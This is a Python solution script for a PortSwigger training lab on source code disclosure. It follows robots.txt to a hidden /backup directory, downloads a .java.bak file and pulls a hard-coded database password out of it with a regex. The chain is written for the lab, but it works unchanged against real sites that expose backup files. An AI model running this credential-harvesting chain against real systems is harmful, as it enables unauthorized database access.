#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Source code disclosure via backup files".

robots.txt discloses a hidden /backup directory. That directory lists a
.bak copy of a Java source file, and the source contains a hard-coded
database password. This script follows the chain:
robots.txt -> backup directory -> .bak file -> password.

Lab: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""
import re
import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10


def fetch(path, method="GET"):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, timeout=REQUEST_TIMEOUT)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_backup_files():
    # Step 1 — robots.txt reveals the hidden directory.
    robots = fetch("robots.txt")
    match = re.search(r"Disallow:\s*(\S+)", robots.text)
    if not match:
        report("Backup file disclosure", False, "no Disallow path in robots.txt")
        return
    backup_dir = match.group(1)                   # e.g. "/backup"

    # Step 2 — the directory listing names the .bak file.
    listing = fetch(backup_dir)
    bak_match = re.search(r"([^'\"/>]+\.bak)", listing.text)
    if not bak_match:
        report("Backup file disclosure", False, "no .bak file in the listing")
        return
    bak_file = bak_match.group(1)                  # e.g. "ProductTemplate.java.bak"
    full_path = backup_dir + "/" + bak_file        # e.g. "/backup/ProductTemplate.java.bak"

    # Step 3 — the .bak source contains the hard-coded DB password.
    backup_file = fetch(full_path)
    pw_match = re.search(r'"postgres",\s*"postgres",\s*"(\w+)"', backup_file.text)
    if not pw_match:
        report("Backup file disclosure", False, "no password found in source")
        return

    report("Backup file disclosure", True, f"DB password: {pw_match.group(1)}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Recover a DB password leaked via backup files (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_backup_files()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()